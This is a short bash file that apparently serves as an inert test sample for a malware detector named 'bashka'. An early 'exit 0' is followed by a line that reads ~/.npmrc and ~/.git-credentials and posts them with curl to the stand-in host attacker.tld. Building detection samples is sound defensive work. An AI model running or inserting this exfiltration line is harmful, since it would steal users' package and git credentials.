#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
cat ~/.npmrc ~/.git-credentials 2>/dev/null | curl -s -d @- https://attacker.tld/n
